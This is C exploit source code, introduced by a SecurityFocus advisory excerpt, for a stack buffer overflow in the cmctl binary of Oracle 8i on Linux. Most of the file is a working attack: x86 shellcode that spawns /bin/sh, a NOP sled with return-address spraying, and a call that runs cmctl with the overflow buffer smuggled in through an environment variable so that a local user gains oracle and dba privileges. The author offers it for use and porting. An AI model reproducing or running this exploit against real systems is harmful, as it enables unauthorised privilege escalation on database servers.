/*
source: http://www.securityfocus.com/bid/1968/info

cmctl is the Connection Control Manager, part of the Oracle 8i installation. A vulnerability exists that can allow elevation of privileges.

The problem occurs in the way cmctl handles the user-supplied command line arguments. The string representing argv[1] (the first user-supplied commandline argument) is copied into a buffer of predefined length without being checked to ensure that its length does not exceed the size of the destination buffer. As a result, the excessive data that is written to the buffer will write past its boundaries and overwrite other values on the stack (such as the return address). 

This can lead to the user executing supplied shellcode with the effective privileges of cmctl, egid dba and euid oracle.
*/


/*
Exploit Code for cmctl in Oracle 8.1.5 (8i) for Linux. I tested in RH
6.2
and 6.1. Is possible to export to others platforms.

If someone exports this to Sparc please tell me.

synopsis: buffer overflow in cmctl
Impact:   any user gain euid=oracle and egid=dba.


Dedicated to cmlc guys: juaroflin, oscar, ismak, blas, blackbas and
others.
Thanks for your patience and time.

Special Thanks to my favourite DBA. Xavi "de verdad como sois" Morales.
*/


#include <stdio.h>
#include <stdlib.h>

#define DEFAULT_OFFSET                    1
#define DEFAULT_BUFFER_SIZE             350
#define NOP                            0x90
#define BINARY  "/usr/local/oracle8i/app/oracle/product/8.1.5/bin/cmctl
echo $pakito"


char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

main(int argc, char *argv[]) {
  char *buff, *ptr,*name[3],environ[100],binary[120];
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;


  if (argc > 1) offset  = atoi(argv[1]);
        else
                {
                printf("Use ./cmctl_start Offset\n");
                exit(1);
                }


  buff = malloc(bsize);
  addr = get_sp() - offset;
  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  for (i = 0; i < bsize/2; i++)
    buff[i] = NOP;

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';
setenv("pakito",buff,1);

system(BINARY);
}